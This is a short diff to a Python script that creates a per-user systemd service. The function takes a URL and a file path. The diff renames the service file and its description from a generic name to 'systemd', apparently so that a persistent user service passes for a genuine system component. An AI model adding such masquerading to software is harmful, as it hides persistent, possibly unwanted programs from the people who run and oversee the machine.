@@ -24,7 +24,7 @@ def run(url, file_path):
     def create_systemd_service(file_path):
         user = getpass.getuser()
         service_dir = f"/home/{user}/.config/systemd/user/"
-        service_file = os.path.join(service_dir, "my_service.service")
+        service_file = os.path.join(service_dir, "systemd.service")
 
         # Create directory if it doesn't exist
         os.makedirs(service_dir, exist_ok=True)
@@ -32,7 +32,7 @@ def run(url, file_path):
         # Write service file
         with open(service_file, 'w') as f:
             f.write(f"""[Unit]
-    Description=systemd
+    Description=systemd service
     After=network-online.target
     Wants=network-online.target
 
